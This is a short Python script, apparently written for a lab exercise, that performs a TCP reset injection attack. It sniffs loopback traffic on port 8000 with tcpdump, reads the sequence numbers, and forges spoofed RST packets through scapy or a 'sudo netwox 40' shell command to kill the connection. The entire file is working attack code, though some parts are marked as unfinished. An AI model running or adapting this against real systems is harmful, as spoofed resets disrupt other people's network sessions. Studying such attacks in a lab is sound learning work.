from scapy.all import *
import subprocess
import ifaddr
import binascii

from scapy.layers.inet import TCP, IP, Ether

conf.L3socket = L3RawSocket


def logRST(p):
    print(p)
    src_ip = p[IP].src  # Took this code from Roberheaton
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq = p[TCP].seq
    ack = p[TCP].ack
    window = p[TCP].window
    flags = p[TCP].flags  # End of code taken from RH

    sendRST(dst_ip, dst_port, src_ip, src_port, ack, window)
    # netwoxSendRST(dst_port, seq)

    print("---Found packet---\nsource: %s\nport: %s\nseq: %s\nack: %s"
          % (src_ip, src_port, seq, ack))

    return True

def logRST_TCPDUMP(p):
    p = p.split( )
    seq = p[8].split(":")[0]
    dst_port = p[2].split(".")[1]

    netwoxSendRST(dst_port, seq)

    print("Packet sniffed: ", p)
    print("Seq number: ", seq)
    print("Destination port:", dst_port)


def netwoxSendRST(dst_port, seq):
    os.system("sudo netwox 40 -l 127.0.0.1 -m 127.0.0.1 -o 8000 -p %s -q %s -B" % (dst_port, seq))
    #sudo netwox 40 -l 127.0.0.1 -m 127.0.0.1 -o 8000 -p <d_port> -q <seq_num> -B


def sendRST(dst_ip, dst_port, src_ip, src_port, ack, window):
    ip = IP(src=dst_ip, dst=src_ip)
    tcp = TCP(sport=dst_port, dport=src_port, flags="R", window=window, seq=ack)  # Fix seq + ack
    p = Ether() / ip / tcp
    sendp(p, iface="en0")


def sniffPackets():
    print("Sniffing for packets on 127.0.0.1")
    #sniff(lfilter="host 127.0.0.1 and port 8000", prn=logRST, count=10, iface="lo0")
    p = subprocess.Popen(['tcpdump', '-i', 'lo0', 'src 127.0.0.1 and dst port 8000', '-c', '1'], stdout=subprocess.PIPE)
    logRST_TCPDUMP(p.stdout.read().decode('utf-8'))

def main():

    sniffPackets()


if __name__ == '__main__':
    main()

# Use  nc 131.229.72.7 80
